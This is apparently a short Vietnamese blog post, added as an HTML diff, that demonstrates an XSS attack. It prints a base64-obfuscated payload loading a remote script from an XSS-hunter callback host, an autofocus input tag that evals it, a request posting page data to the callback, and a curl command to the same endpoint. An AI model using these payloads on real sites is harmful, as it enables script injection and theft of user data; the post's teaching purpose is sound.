@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
+        <title>AhaXu Blog - (Vi) XSS attack sample</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+        <link rel="stylesheet" type="text/css" href="../css/default.css" />
+        <link rel="stylesheet" type="text/css" href="../css/syntax.css" />
+        <!-- Google tag (gtag.js) -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-1PHNTX4TPM"></script>
+        <script>
+              window.dataLayer = window.dataLayer || [];
+              function gtag(){dataLayer.push(arguments);}
+              gtag('js', new Date());
+
+              gtag('config', 'G-1PHNTX4TPM');
+        </script>
+    </head>
+    <body class"container-fluid">
+        <div id="header">
+            <div id="logo">
+                <a href="../">AhaXu Blog</a>
+            </div>
+            <div id="navigation">
+              <a href="../"><i class="bi bi-house-heart-fill"></i> </a>
+                <a href="../about.html"><i class="bi bi-info-circle-fill"></i> </a>
+                <a href="../archive.html"><i class="bi bi-file-code-fill"></i> </a>
+            </div>
+        </div>
+
+        <div id="content">
+					
+						<h2>(Vi) XSS attack sample</h2>
+            <div class="info">
+    Posted on November 17, 2022
+    
+        by lk
+    
+</div>
+
+<p><strong>XSS attack là kỹ thuật tấn công khá phổ biến bên cạnh SQL injection. Hãy cùng xem thử một ví dụ mà attacker inject thành công một đọan mã độc vào hệ thống nhé!</strong></p>
+<p>Đầu tiên, hãy chạy đoạn thử js này trong js console</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> <span class="fu">atob</span>(<span class="st">'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'</span>)</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> <span class="st">'var a=document.createElement(&quot;script&quot;);a.src=&quot;https://d0x5.xss.ht&quot;;document.body.appendChild(a);'</span></span></code></pre></div>
+<p>một vài browser hiện đại thì đã chặn việc chạy các đoạn mã độc như trên</p>
+<pre><code>&gt; # thử eval đoạn mã độc phía trên 
+&gt; eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'))
+
+&gt; VM91:1 This document requires 'TrustedScript' assignment and no 'default' policy for 'TrustedScript' has been defined.
+(anonymous) @ VM91:1
+VM91:1 Uncaught EvalError: Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script in the following Content Security Policy directive: &quot;script-src chrome://resources 'self'&quot;.</code></pre>
+<p>Nếu bạn tò mò, tận mắt thấy, hãy nhúng đoạn code dưới này vào file html bất kỳ nào đó, mở ở chế độ <strong>private mode</strong></p>
+<pre><code>&lt;input
+    onfocus=eval(atob(this.id))
+    id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7
+ autofocus&gt;</code></pre>
+<p>link đến thư viện mà attacker xài, https://d0x5.xss.ht/ . Biết đâu bạn có thể modify một vài thông tin gửi về attacker = việc modify data
+gửi về cho attacker trong hàm bên dưới</p>
+<pre><code>    var http = new XMLHttpRequest();
+    var url = &quot;https://d0x5.xss.ht/page_callback&quot;;
+    http.open(&quot;POST&quot;, url, true);
+    http.setRequestHeader(&quot;Content-type&quot;, &quot;text/plain&quot;);
+    http.onreadystatechange = function() {
+        if(http.readyState == 4 &amp;&amp; http.status == 200) {
+
+        }
+    }
+    http.send( JSON.stringify( page_data ) );
+}</code></pre>
+<p>Hoặc callback luôn bằng curl</p>
+<pre><code>&gt; curl -v -XPOST 'https://d0x5.xss.ht/page_callback' -d'{&quot;page_html&quot;:&quot;fuckyou&quot;, &quot;uri&quot;:&quot;fuck you again&quot;}'</code></pre>
+<p><strong>Hãy luôn sanitize input data có kiểu string ;) và kỹ hơn nữa thì nên sanitize data load từ database khi render html page.</strong></p>
+<p>Nếu bạn còn tò mò, hãy vọc vạch thêm từ đây https://xsshunter.com/</p>
+
+							
+				</div>
+        <div id="footer">
+						AhaXuBlog@2022 - generated by Hakyll
+        </div>
+    </body>
+</html>
